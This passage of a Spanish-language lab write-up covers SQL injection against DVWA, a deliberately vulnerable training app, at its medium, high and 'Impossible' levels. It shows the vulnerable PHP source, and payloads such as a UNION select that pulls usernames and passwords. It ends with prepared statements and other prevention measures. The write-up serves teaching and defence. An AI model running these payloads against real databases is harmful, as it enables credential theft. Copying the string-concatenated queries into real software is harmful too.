            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

            while( $row = mysqli_fetch_assoc( $result ) ) {
                $first = $row["first_name"];
                $last  = $row["last_name"];
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }
            break;
        [...]
    }
}
?>
```

El `mysqli_real_escape_string()` escapa comillas y otros caracteres especiales, pero la consulta usa `WHERE user_id = $id` sin comillas alrededor de `$id`. Esto significa que las comillas no son necesarias para inyectar código SQL en este contexto, haciendo que el escape sea completamente inútil.

> **Advertencia:** `mysqli_real_escape_string()` solo protege eficazmente cuando el valor se inserta entre comillas en la consulta (`WHERE id = '$id'`). Sin las comillas, expresiones como `1 OR 1=1` se inyectan directamente sin necesidad de comillas, eludiendo por completo el escape.

---

## 4. SQL Injection en acción — nivel high

Tras configurar el nivel de seguridad en DVWA a `high` y acceder a la sección de SQL Injection, aparece un enlace que abre una nueva ventana a través de la cual se puede solicitar la información de un usuario introduciendo el id. Esta ventana carga la URL `192.168.100.4/dvwa/vulnerabilities/sqli/session-input.php`.

![Ventana flotante nivel high](./imagenes/sql%20injection/33.png)

---

### 4.1 Particularidad del nivel high: variables de sesión

Al revisar el funcionamiento de la aplicación se observa que el id introducido en el formulario se envía mediante `POST` a `session-input.php`, y acto seguido se solicita la página `/dvwa/vulnerabilities/sqli/` donde aparece la información del usuario.

```
#199  POST  http://192.168.100.4  /dvwa/vulnerabilities/sqli/session-input.php
#200  GET   http://192.168.100.4  /dvwa/vulnerabilities/sqli/
```

En esta aplicación, la entrada se pasa a la consulta vulnerable **a través de variables de sesión** en lugar de directamente mediante `GET` o `POST`. Al tratarse de datos de sesión almacenados en el lado del servidor, no se puede acceder a ellos directamente para verlos, pero sí se pueden inyectar payloads maliciosos que, al pasarse a la consulta SQL, permitirán la exfiltración de información.

Se comienza comprobando la presencia de la vulnerabilidad SQLi inyectando `'`:

```bash
Fatal error: You have an error in your SQL syntax; check the manual that corresponds to your
MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1
```

Y con `' or 1=1#` se obtienen todos los usuarios, confirmando la vulnerabilidad. El número de columnas se descubre con `1' ORDER BY 3#`, que devuelve error, confirmando que la consulta devuelve **dos columnas**.

El proceso de enumeración y extracción de información es **idéntico al nivel *low*** salvo por el vector de entrada (formulario de sesión en lugar de parámetro GET directo).

Los datos de sesión se almacenan en el sistema de ficheros del servidor en la ruta indicada por `session.save_path`, que en esta instalación es `/var/lib/php/sessions`. Dentro de una terminal en el servidor se puede verificar que la entrada del usuario se guarda directamente sin ningún proceso de validación o saneamiento:

```bash
usuario@ubuntuserver:~$ sudo ls -lhF /var/lib/php/sessions/
total 4,0K
-rw------- 1 www-data www-data 185 oct 4 21:40 sess_ijicpu0q0r5f8eomochf9cbp7c

usuario@ubuntuserver sudo cat /var/lib/php/sessions/sess_ijicpu0q0r5f8eomochf9cbp7c
dvwa|a:3:{s:6:"locale";s:2:"en";s:8:"messages";a:0:
{}s:8:"username";s:5:"admin";}session_token|s:32:"29c2e33cf2f49453cdde7bd191eb97ec";
id|s:39:"' union select user,password from users#";
```

> **Nota:** El uso de variables de sesión como vector de inyección es una técnica que dificulta la detección y el análisis automático de la vulnerabilidad por parte de escáneres, ya que la entrada maliciosa no aparece directamente en los parámetros de la petición HTTP que llega al endpoint vulnerable. Sin embargo, la vulnerabilidad subyacente es exactamente la misma: la entrada del usuario se incorpora sin saneamiento a una consulta SQL dinámica.

---

### 4.2 Análisis del código fuente — nivel high

El código fuente confirma que la consulta SQL recibe la información a través de la variable de sesión `$_SESSION['id']` y que no hay ningún proceso de validación o saneamiento de la entrada del usuario:

```php
<?php
if( isset( $_SESSION [ 'id' ] ) ) {
    $id = $_SESSION[ 'id' ];

    switch ($_DVWA['SQLI_DB']) {
        case MYSQL:
            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

            while( $row = mysqli_fetch_assoc( $result ) ) {
                $first = $row["first_name"];
                $last  = $row["last_name"];
                echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            }

            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
            break;

        case SQLITE:
            global $sqlite_db_connection;
            $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
            try {
                $results = $sqlite_db_connection->query($query);
            } catch (Exception $e) {
                echo 'Caught exception: ' . $e->getMessage();
                exit();
            }
            if ($results) {
                while ($row = $results->fetchArray()) {
                    $first = $row["first_name"];
                    $last  = $row["last_name"];
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
            } else {
                echo "Error in fetch ".$sqlite_db->lastErrorMsg();
            }
            break;
    }
}
?>
```

La adición de `LIMIT 1` al final de la consulta es una medida cosmética que solo limita el número de resultados devueltos por la consulta original, pero no impide que el operador `UNION` inyectado añada sus propias filas al resultado.

---

## 5. Prevención — nivel Impossible

El nivel de seguridad `Impossible` usa **consultas parametrizadas** (*parameterized queries* o *prepared statements*) como medida de protección frente a ataques SQLi. En las consultas parametrizadas, el programador tiene que definir primero todo el código SQL y después pasar cada parámetro a la consulta. Este estilo de consulta permite distinguir entre código y datos, con independencia de la entrada del usuario.

Las consultas parametrizadas garantizan que un atacante no pueda cambiar la intención de una consulta aunque inserte comandos SQL. Por ejemplo, si un atacante introdujese como id de usuario `1' or 1=1`, la consulta no sería vulnerable y en su lugar buscaría un nombre de usuario que coincidiese literalmente con toda la cadena `1' or 1=1`.

```php
<?php
if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        $id = intval($id);

        switch ($_DVWA['SQLI_DB']) {
            case MYSQL:
                // Prepared statement: el código SQL se define primero, los datos después
                $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
                $data->bindParam( ':id', $id, PDO::PARAM_INT );
                $data->execute();
                $row = $data->fetch();

                if( $data->rowCount() == 1 ) {
                    $first = $row[ 'first_name' ];
                    $last  = $row[ 'last_name' ];
                    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                }
                break;

            case SQLITE:
                global $sqlite_db_connection;
                $stmt = $sqlite_db_connection->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' );
                $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
                $result = $stmt->execute();
                $result->finalize();
                if ($result !== false) {
                    $num_columns = $result->numColumns();
                    if ($num_columns == 2) {
                        $row = $result->fetchArray();
                        $first = $row[ 'first_name' ];
                        $last  = $row[ 'last_name' ];
                        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
                    }
                }
                break;
        }
    }
}
// Generate Anti-CSRF token
generateSessionToken();
?>
```

Las medidas de prevención recomendadas frente a vulnerabilidades de inyección SQL son:

**Uso de consultas parametrizadas** en lugar de consultas dinámicas donde se concatenan entradas del usuario directamente en la consulta. El ejemplo correcto es:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->bindParam(':username', $userInput);
$stmt->execute();
```

**Uso de listas blancas para validar entradas**: las consultas parametrizadas se pueden usar cuando aparezcan entradas que no son de confianza como datos dentro de la consulta (`WHERE` y los valores en `INSERT` o `UPDATE`). Sin embargo, no son válidas para manejar entradas en otras partes de la consulta, como nombres de tablas o columnas, o con `ORDER BY`. Para estos casos, los valores deben asignarse a nombres de tablas o columnas legales/esperados para asegurarse de que la entrada del usuario no validada no termine en la consulta.

**Escapar todas las entradas del usuario**: como medida complementaria, nunca como única defensa.

**Principio de mínimo privilegio**: la cuenta de usuario usada por la aplicación para acceder a la base de datos debe tener los mínimos privilegios posibles para realizar sus tareas.

**Evitar mensajes de error informativos**: los mensajes de error SQL detallados proporcionan al atacante información valiosa sobre la estructura de la base de datos. En producción, los errores deben registrarse en el servidor y mostrarse al usuario únicamente mensajes genéricos.

**Web Application Firewall (WAF)**: implementar un WAF que pueda detectar y bloquear intentos de inyección SQL como capa de defensa adicional.

> **Importante:** Las consultas parametrizadas son la única defensa completamente fiable contra SQLi. El escapado de caracteres con `mysqli_real_escape_string()` o funciones similares puede ser suficiente en ciertos contextos, pero falla cuando el valor no está entre comillas en la consulta, cuando se usa en contextos como `ORDER BY` o nombres de columna, o ante ciertos juegos de caracteres multibyte. Siempre que sea posible, se deben usar *prepared statements*.
